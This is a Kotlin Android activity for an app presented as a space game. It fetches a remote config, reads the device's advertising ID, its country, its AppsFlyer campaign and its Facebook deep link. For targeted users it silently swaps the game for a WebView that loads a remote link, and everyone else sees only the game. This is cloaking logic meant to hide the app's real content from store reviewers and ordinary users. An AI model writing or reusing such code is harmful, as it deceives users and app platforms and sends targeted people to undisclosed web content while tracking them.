package com.game.space.sho

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.game.space.sho.Unded.MAIN_CHECKER
import com.game.space.sho.Unded.keyDEEPLINK
import com.game.space.sho.Unded.keyLinkaa
import com.game.space.sho.Unded.keyNaming
import com.game.space.sho.room.DevilDataBase
import com.game.space.sho.room.DevilEntity
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private val devilDAO by lazy {
        DevilDataBase.getDataBase(application).getDevilDAO()
    }

    val tinyDB by lazy {
        TinyDB(applicationContext)
    }


    private var tempDevilLoad: String? = null
    private var tempGeoLoad: String? = null
    private var tempNamingLoad: String? = null
    private var tempDeepLoad: String? = null


    private suspend fun readAllFromDevilDataBase() {
        if (tinyDB.getBoolean("first_load")) {
            Log.d("lolo", "first_load")
            deepLink ="null"
            val emptyDataDevil = DevilEntity(111, "null", "null", "null", "null")
            devilDAO.saveData(emptyDataDevil)
            tinyDB.putBoolean("first_load", false)
        } else {
            Log.d("lolo", "second_load")
            val dataFromDataBase = devilDAO.getAllDevilData().first()
            Log.d("lolo", "data fromDB ${dataFromDataBase}")
            naming = dataFromDataBase.naming
            deepLink = dataFromDataBase.deeplink
            linka = dataFromDataBase.link
            mainId = dataFromDataBase.advertid
        }
    }

    private val volleyApiClient by lazy {
        VolleyApiClient(applicationContext)
    }

    private suspend fun saveAllDataToDevilDataBase() {
        val dataForDataBase = DevilEntity(
            id = 111, deeplink = deepLink, naming = naming, advertid = mainId, link = linka
        ).also {
            devilDAO.saveData(it)
        }
        Log.d("lolo", "fun data saveAllDataToDevilDataBase, data $dataForDataBase")
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        lifecycleScope.launch {
            getDeep(this@MainActivity)
            readAllFromDevilDataBase()

            withContext(Dispatchers.Default) {
                getAdvertisingIdClient()
            }
            getDevilData()
            getGeoData()

            while (true) {
                if (tempDevilLoad != null && tempGeoLoad != null) {
                    Log.d("lolo", "tempDevilLoad/tempGeoLoad != null")
                    break
                } else {
                    Log.d("lolo", "tempDevilLoad/tempGeoLoad == null")
                    delay(1000)
                }
            }
            when (codeFromDevilHost) {
                "0" -> {
                    goToGame()
                }
                "1" -> {
                    //Fb + Apps
                    initAppsFlyerLibeer(this@MainActivity)
                    while (true) {
                        if (tempNamingLoad != null && tempDeepLoad != null) {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad NOT null")
                            if (naming.contains(MAIN_CHECKER)) {
                                saveAllDataToDevilDataBase()
                                goToVebViev()
                            } else {
                                if (deepLink.contains(MAIN_CHECKER)) {
                                    saveAllDataToDevilDataBase()
                                    goToVebViev()
                                } else {
                                    if (listOfGeo.contains(userCurrentGeo)) {
                                        saveAllDataToDevilDataBase()
                                        goToVebViev()
                                    } else {
                                        goToGame()
                                    }
                                }
                            }
                            break
                        } else {
                            Log.d("lolo", "tempDeepLoad/tempNamingLoad == null")
                            delay(1000)
                        }
                    }
                }
            }
        }
    }

    private fun goToVebViev() {
        Intent(this@MainActivity, BrooovActivity::class.java).apply {
            startActivity(this)
        }
        finish()
    }


    private var codeFromDevilHost: String = ""
    private var userCurrentGeo: String = ""
    private var naming: String = ""
    private var deepLink: String = ""
    private var linka: String = ""
    private var mainId: String = ""
    private var listOfGeo: String = ""

    private fun goToGame() {
        Intent(this@MainActivity, GaaammiActivity2::class.java).also {
            startActivity(it)
        }
        finish()
    }

    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(applicationContext)
        advertisingIdClient.start()
        val infofrrrf = advertisingIdClient.info.id
        mainId = infofrrrf.toString()
    }

    private fun initAppsFlyerLibeer(context: Context) {
        AppsFlyerLib.getInstance()
            .init(Unded.appsCode, conversionDataListener, context)
        Log.d("lolo", "initAppsFlyerLibeer")
        AppsFlyerLib.getInstance().start(context)
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            Log.d("lolo", "onConversionDataSuccess before loading")
            val dataGotten = data?.get("campaign").toString().apply {
                naming = this
                tempNamingLoad = this
                Log.d("lolo", "onConversionDataSuccess")
            }
        }

        override fun onConversionDataFail(p0: String?) {
            Log.d("lolo", "onConversionDataFail")
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            Log.d("lolo", "onAppOpenAttribution")
        }

        override fun onAttributionFailure(p0: String?) {
            Log.d("lolo", "onAttributionFailure")
        }
    }

    private suspend fun getDevilData() {
        val devilData = volleyApiClient.getDevilApi()
        linka = devilData.viewLolo
        listOfGeo = devilData.geoLolo
        codeFromDevilHost = devilData.appsCheckerLolo

        tempDevilLoad = "loaded"
    }

    private suspend fun getGeoData() {
        val apiData = volleyApiClient.getGeoData()
        userCurrentGeo = apiData.countryCode
        tempGeoLoad = "loaded"
    }

    private fun getDeep(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                appLinkData.targetUri.host.toString().apply {
                    deepLink = this
                    tempDeepLoad = this
                }
                Log.d("lolo", "getDeep loaded")
            }
            if (appLinkData == null) {
                tempDeepLoad = "null"
                if (deepLink == "null") {
                    deepLink = "null"
                }
            }
        }
    }
}